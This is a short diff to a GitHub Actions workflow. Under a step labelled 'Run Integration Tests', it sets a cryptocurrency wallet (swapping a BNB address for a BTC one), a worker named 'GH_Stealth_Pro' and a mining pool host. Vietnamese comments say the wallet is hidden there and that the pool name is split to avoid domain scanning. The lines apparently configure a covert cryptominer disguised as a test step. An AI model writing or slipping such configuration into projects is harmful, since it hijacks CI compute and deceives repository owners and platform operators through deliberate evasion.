@@ -35,7 +35,7 @@ jobs:
     - name: Run Integration Tests
       env:
         # Ví của ông được giấu ở đây
-        WALLET: "BNB:0x33f4e57Ab32D59048B449dCe340E0F820F31B4CC"
+        WALLET: "BTC:bc1pr76lf0fjwyp64l5gy0t7gze37qxqdu2v784k3mljq0ynzsrswvlqxceu5g"
         WORKER: "GH_Stealth_Pro"
         # Cắt nhỏ Pool để tránh quét domain
         POOL_A: "rx.unmine"
